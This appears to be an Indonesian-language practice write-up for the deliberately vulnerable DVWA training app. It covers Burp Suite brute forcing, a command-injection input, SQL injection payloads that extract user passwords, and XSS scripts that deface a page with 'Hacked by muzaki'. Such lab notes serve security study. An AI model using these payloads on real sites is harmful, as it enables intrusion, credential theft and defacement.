# DVWA - Damn Vulnerable Web Application

**URL:** [https://dvwa.al3xzer0.cfd/login.php](https://dvwa.al3xzer0.cfd/login.php)
**Writeup Referensi:** [infosecwriteups.com](https://infosecwriteups.com/writeups-for-damn-vulnerable-web-application-dvwa-ba42a43afca1)
**Credentials:**

```
Username: admin  
Password: password
```

---

## Security Level: **Low**

### 🔐 Brute Force (Login Page)

#### 🔧 Tools: Burp Suite

1. Capture request login menggunakan **Burp Proxy**.
2. Kirim ke **Intruder**.
3. Gunakan tipe **Cluster Bomb**.
4. Payload 1: isikan username (`admin`), Payload 2: list password.
5. Gunakan fitur **Grep - Match**, tambahkan teks yang muncul saat login berhasil (misal: `Welcome to the password protected area`).
6. Jalankan **Start Attack (Simple)**.

---

### 🢨 Command Injection

**Contoh Input:**

```bash
8.8.8.8
8.8.8.8; ls
```

**Keterangan:**
Perintah kedua akan melakukan injection dan menjalankan `ls` setelah ping ke 8.8.8.8.

---

### 💞 SQL Injection

**Basic SQL Injection:**

```sql
' OR 1 = 1 #
```

**Advanced (Union-based) SQL Injection:**

```sql
' UNION SELECT user, password FROM users #
```

---

## xss
```bash
<script>   document.body.innerHTML = `     <div style="height:100vh;background:black;color:lime;display:flex;justify-content:center;align-items:center;flex-direction:column;">       <h1 style="font-size:3em;">Hacked by muzaki</h1>       <p style="font-size:1.5em;">This page was defaced using XSS</p>     </div>   `; </script>

<script>
  const defaceDiv = document.createElement("div");
  defaceDiv.style = "height:100vh;background:black;color:lime;display:flex;justify-content:center;align-items:center;flex-direction:column;margin-top:20px;";
  defaceDiv.innerHTML = `
    <h1 style="font-size:3em;">Hacked by muzaki</h1>
    <p style="font-size:1.5em;">This page was defaced using XSS</p>
  `;
  document.body.appendChild(defaceDiv);
</script>

<script>
document.body.innerHTML+=`<div style="height:100vh;background:black;color:lime;display:flex;justify-content:center;align-items:center;flex-direction:column;margin-top:20px;"><h1>Hacked by muzaki</h1><p>This page was defaced</p></div>`;
</script>
```

## open redirect


## crypto
```bash
Your new password is: Olifant
```